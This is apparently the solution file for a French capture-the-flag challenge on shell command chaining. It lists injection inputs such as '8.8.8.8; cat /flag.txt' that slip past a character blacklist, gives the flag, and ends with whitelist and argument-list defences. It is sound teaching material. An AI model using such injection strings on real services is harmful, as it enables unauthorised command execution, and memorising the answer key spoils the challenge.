# SOLUTION — Challenge 01 : Command Chaining

## Vulnérabilité

Le wrapper bloque `|` et `&` mais oublie plusieurs autres opérateurs de chaînage Bash :
- `;` — exécute les commandes séquentiellement
- `%0a` / saut de ligne — séparateur de commande
- `$(...)` — substitution de commande (non bloquée ici)

## Exploits valides

```bash
# Avec le point-virgule
./wrapper "8.8.8.8; cat /flag.txt"

# Avec la substitution de commande
./wrapper "$(cat /flag.txt)"

# Avec un saut de ligne (dans le terminal interactif)
./wrapper $'8.8.8.8\ncat /flag.txt'
```

## Flag

```
HackUTT{ch41n1ng_s3m1c0l0n_ftw}
```

## Explication pédagogique

### Opérateurs de chaînage en Bash

| Opérateur | Comportement |
|-----------|-------------|
| `cmd1 \| cmd2` | Pipe : stdout de cmd1 → stdin de cmd2 |
| `cmd1 & cmd2` | cmd1 en arrière-plan, cmd2 immédiatement |
| `cmd1 && cmd2` | cmd2 uniquement si cmd1 réussit (code retour 0) |
| `cmd1 \|\| cmd2` | cmd2 uniquement si cmd1 échoue |
| `cmd1 ; cmd2` | Toujours exécuter cmd2 après cmd1 |
| `cmd1\ncmd2` | Saut de ligne = séparateur comme `;` |
| `$(cmd1)` | Substitution : résultat injecté dans la commande parente |

### Comment s'en protéger ?

**Mauvaise approche** : blacklist de caractères → toujours incomplet.

**Bonne approche** : validation stricte par whitelist.

```c
// Exemple de validation par whitelist (C)
int is_valid_ip(const char *s) {
    // N'autoriser que chiffres et points
    for (int i = 0; s[i]; i++) {
        if (!isdigit(s[i]) && s[i] != '.') return 0;
    }
    return 1;
}
```

```python
# En Python : utiliser subprocess avec liste d'arguments (jamais shell=True)
import subprocess
subprocess.run(["ping", "-c", "1", user_input])  # Pas d'injection possible
```

La règle d'or : **ne jamais construire une commande shell par concaténation de chaînes**.
Utiliser les APIs système qui prennent des tableaux d'arguments.
